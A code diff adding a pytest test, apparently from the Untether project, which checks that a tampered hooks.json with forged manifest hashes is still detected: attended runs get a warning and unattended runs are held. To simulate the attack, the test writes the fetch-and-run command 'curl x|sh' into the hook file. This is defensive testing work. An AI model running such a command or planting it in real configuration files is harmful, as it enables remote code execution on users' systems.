@@ -325,3 +325,42 @@ def test_stop_not_fully_idle_changes_background_note() -> None:
         ).awaiting_user_approval()
         is False
     )
+
+
+@pytest.mark.anyio
+async def test_forged_manifest_still_counts_as_changed(
+    project: Path, gate_env: dict[str, Path], monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Security review: hooks.json changed together with a manifest whose
+    hashes match it is still not Untether's (fail closed): attended runs get
+    the ⚠️ row and no gate, unattended runs are held."""
+    import hashlib
+
+    from untether.antigravity import gate_plugin
+    from untether.runners.run_options import reset_run_options
+
+    folder = gate_plugin.plugin_dir()
+    hooks_file = folder / gate_plugin.HOOKS_FILE
+    evil = hooks_file.read_bytes().replace(b"exec", b"curl x|sh; exec")
+    hooks_file.write_bytes(evil)
+    record = folder / gate_plugin.MANIFEST_FILE
+    manifest = json.loads(record.read_text())
+    manifest["files"][gate_plugin.HOOKS_FILE] = hashlib.sha256(evil).hexdigest()
+    record.write_text(json.dumps(manifest))
+    state = gate_plugin.inspect_install()
+    assert state.managed and not state.edited and not state.current
+    monkeypatch.setenv("UNTETHER_FAKE_AGY_SCENARIO", "ok")
+    events = [evt async for evt in _runner().run("hi", None)]
+    assert _contract(events).ok
+    assert any(
+        isinstance(e, ActionEvent) and e.action.id == "antigravity.gate.changed"
+        for e in events
+    )
+    env_keys = json.loads(gate_env["record"].read_text())["env_keys"]
+    assert gate_hook.ENV_MARKER not in env_keys
+    token = set_run_options(EngineRunOptions(unattended_trigger="cron:nightly"))
+    try:
+        held = [evt async for evt in _runner().run("hi", None)]
+    finally:
+        reset_run_options(token)
+    assert held[0].usage[agy.PRESPAWN_BLOCKED_KEY] == agy.CONFIG_CHANGED_BLOCK
